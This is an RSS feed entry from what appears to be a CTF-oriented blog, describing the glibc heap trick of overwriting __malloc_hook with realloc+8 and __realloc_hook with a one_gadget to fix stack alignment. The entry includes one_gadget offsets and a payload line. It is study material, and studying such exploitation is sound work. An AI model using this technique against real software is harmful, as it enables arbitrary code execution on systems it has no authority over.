channel.title: Realloc调整堆栈 on f1ow-blog
channel.description: Recent content in Realloc调整堆栈 on f1ow-blog

item.title: realloc调整堆栈
item.description: 注意realloc_hook就在malloc_hook-8的位置 # __malloc_hook -> realloc+8 # __realloc_hook -> one_gadget realloc = libc_base + libc.sym['realloc'] one_gadget = [0x4527a, 0xf03a4, 0xf1247] add(4, 0x68, b'p' * 11 + p64(libc_base + one_gadget[0]) + p64(realloc + 8))
